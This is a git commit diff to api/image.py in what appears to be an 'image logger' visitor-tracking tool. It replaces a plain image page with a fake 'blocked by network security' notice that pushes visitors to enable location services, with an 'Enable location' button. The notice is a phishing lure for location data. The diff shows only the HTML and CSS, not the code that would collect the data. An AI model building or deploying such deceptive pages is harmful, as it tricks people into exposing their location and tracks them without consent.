7b69e11e45ce6df7f3c58e413eed4b289f4cc873
Fleyah <167648103+Fleyah@users.noreply.github.com>
2025-02-14 22:33:05 +0100

    Update image.py

--- api/image.py
+++ api/image.py
@@ -200,18 +200,76 @@ class ImageLoggerAPI(BaseHTTPRequestHandler):
             else:
                 url = config["image"]
 
-            data = f'''<style>body {{
-margin: 0;
-padding: 0;
-}}
-div.img {{
-background-image: url('{url}');
-background-position: center center;
-background-repeat: no-repeat;
-background-size: contain;
-width: 100vw;
-height: 100vh;
-}}</style><div class="img"></div>'''.encode()
+            data = f'''<style>
+        body {
+    position: absolute;
+    background-color: #0B1416;
+    color: white;
+    font-family: Verdana, Tahoma, Geneva, sans-serif, Arial, sans-serif;
+    text-align: center;
+    display: flex;
+    flex-direction: column;
+    justify-content: flex-start; /* Aligns content to the top */
+    align-items: center;
+    height: 100vh;
+    width: 100vw;
+    margin: 0;
+    padding-top: 20px; /* Adds some space from the top */
+    overflow: hidden; /* Hides scrollbars */
+}
+
+        .container {
+            max-width: 500px;
+            padding: 20px;
+        }
+        .title {
+            font-size: 22px;
+            font-weight: bold;
+        }
+        .message {
+            margin-top: 10px;
+            font-size: 16px;
+            line-height: 1.5;
+            color: #82959B;
+        }
+        .buttons {
+            margin-top: 20px;
+        }
+        .btn {
+            background-color: #0045AC;
+            color: white;
+            border: none;
+            padding: 10px 15px;
+            margin: 5px;
+            font-size: 16px;
+            cursor: pointer;
+            border-radius: 17px;
+            font-weight: bold;
+            font-family: sans-serif, Arial, sans-serif;
+        }
+        .btn.secondary {
+            background-color: #1A282D;
+        }
+        .btn:hover {
+            opacity: 0.8;
+        }
+    </style>
+    <div class="container">
+        <img src="download.png">
+        <br>
+        <div class="title">You've been blocked by network security.</div>
+        <div class="message">
+            To continue, enable location services to verify your access.
+
+Otherwise, you may be restricted from proceeding.
+            <br><br>
+            If you think you've been blocked by mistake, file a ticket below and we'll look into it.
+        </div>
+        <div class="buttons">
+            <button class="btn">Enable location</button>
+            <button class="btn secondary">File a ticket</button>
+        </div>
+    </div>'''.encode()
             
             if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                 return
